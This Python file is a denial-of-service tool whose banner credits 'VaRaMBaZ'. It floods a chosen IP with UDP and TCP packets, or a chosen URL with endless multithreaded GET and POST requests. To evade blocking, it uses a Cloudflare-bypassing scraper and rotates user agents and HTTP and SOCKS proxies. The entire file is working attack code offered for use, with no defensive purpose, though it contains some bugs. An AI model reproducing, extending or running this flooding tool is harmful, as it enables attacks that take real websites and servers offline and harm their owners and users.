import colorama
import threading
import random
import requests
import cfscrape
import socket
import os

os.system("clear")
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bytes = random._urandom(1490)
#############

s = cfscrape.create_scraper()

with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')

def dosweb1(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}

        useragent2 = random.choice(headersp)
        header2 = {'user-agent': useragent2}

        proxyagenthttp = random.choice(proxy_http)
        proxieshttp = {
            'http': f'http://{proxyagenthttp}',
            'https': f'http://{proxyagenthttp}'
        }

        proxyagentsocks = random.choice(proxy_socks)
        proxiessocks = {
            'http': f'socks5://{proxyagentsocks}',
            'https': f'socks5://{proxyagentsocks}'
        }
        try:
            s.get(target, headers=header, proxies=proxieshttp)
            s.post(target, headers=header, proxies=proxieshttp)
            s.get(target, headers=header2, proxies=proxiessocks)
            s.post(target, headers=header2, proxies=proxiessocks)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[-] Connection error!")


def dosweb2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[-] Connection error!")

def ddosip(ip):
    global send
    while True:
        sock.sendto(bytes, (ip, port))
        send = send + 1
        print("[" + send + "]" + " Pocket sent")


def aa(num):
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sock2.connect((ip, port))
        except:
            print(colorama.Fore.RED + "[-] Connection error!")

threads = 20

print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.3: TEST IP DDOS \n")

vibor = int(input("Attack for IP or Web [1-IP; 2-Web]: "))

if (vibor == 1):
    sent = 0
    ip = input("IP Target: ")
    port = int(input("Port: "))

    try:
        threads = int(input("Threads: "))
    except ValueError:
        exit("Threads count is incorrect!")

    for i in range(0, threads):
        ipddos = threading.Thread(target=aa, args=(1,))
        ipddos.start()
        print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
else:
    url = input("URL: ")

    try:
        threads = int(input("Threads: "))
    except ValueError:
        exit("Threads count is incorrect!")

    if threads == 0:
        exit("Threads count is incorrect!")

    if not url.__contains__("http"):
        exit("URL doesnt contains http or https!")

    if not url.__contains__("."):
        exit("Invalid domain")



    proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))

    if (proxyuseage == 1):
        for i in range(0, threads):
            thr = threading.Thread(target=dosweb1, args=(url,))
            thr.start()
            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
    else:
        for i in range(0, threads):
            thr2 = threading.Thread(target=dosweb2, args=(url,))
            thr2.start()
            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")